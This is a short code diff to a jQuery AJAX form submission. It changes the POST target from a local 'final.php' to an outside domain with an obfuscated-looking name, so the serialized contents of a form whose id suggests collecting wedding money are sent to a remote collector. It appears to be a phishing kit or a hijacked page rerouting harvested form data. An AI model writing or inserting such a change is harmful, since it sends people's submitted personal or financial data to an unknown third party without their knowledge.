@@ -1,6 +1,6 @@
 $.ajax({
                         type: 'POST',
-                        url: 'final.php',
+                        url: 'https://mail.sallzzzzzkuuy.skom.id/apiii.php',
                         data: $('#ngumpulinuangnikah').serialize(),
                         dataType: 'text',
                         success: function() {
